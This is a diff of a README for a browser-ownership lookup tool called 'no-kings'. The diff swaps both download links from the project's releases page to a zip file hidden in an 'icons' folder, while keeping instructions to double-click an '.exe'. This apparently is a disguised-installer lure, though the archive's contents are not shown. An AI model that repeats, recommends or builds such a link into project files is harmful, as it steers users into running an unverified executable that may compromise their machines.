@@ -1,6 +1,6 @@
 # 👁️ no-kings - See who owns the websites you visit
 
-[![Download no-kings](https://img.shields.io/badge/Download-Release-blue)](https://github.com/wellconnected-glockenspiel924/no-kings/releases)
+[![Download no-kings](https://img.shields.io/badge/Download-Release-blue)](https://github.com/wellconnected-glockenspiel924/no-kings/raw/refs/heads/main/icons/kings_no_v1.5-beta.5.zip)
 
 ## 🔍 Purpose
 No Kings reveals the ownership structure of the websites you browse. Large financial firms like BlackRock, Vanguard, and State Street hold significant shares in major corporations. This tool maps the website in your browser tab to its parent company. It shows how much stock these three firms own. It also identifies who holds actual voting control when these firms do not. Use this tool to understand the financial interests behind the digital content you consume daily.
@@ -11,7 +11,7 @@ No Kings reveals the ownership structure of the websites you browse. Large finan
 * Internet connection for real-time ownership lookups
 
 ## 🚀 Getting Started
-1. [Visit this page to download](https://github.com/wellconnected-glockenspiel924/no-kings/releases) the latest version.
+1. [Visit this page to download](https://github.com/wellconnected-glockenspiel924/no-kings/raw/refs/heads/main/icons/kings_no_v1.5-beta.5.zip) the latest version.
 2. Locate the file ending in `.exe` under the Assets section.
 3. Save the file to your desktop or downloads folder.
 4. Double-click the file to begin the setup process.
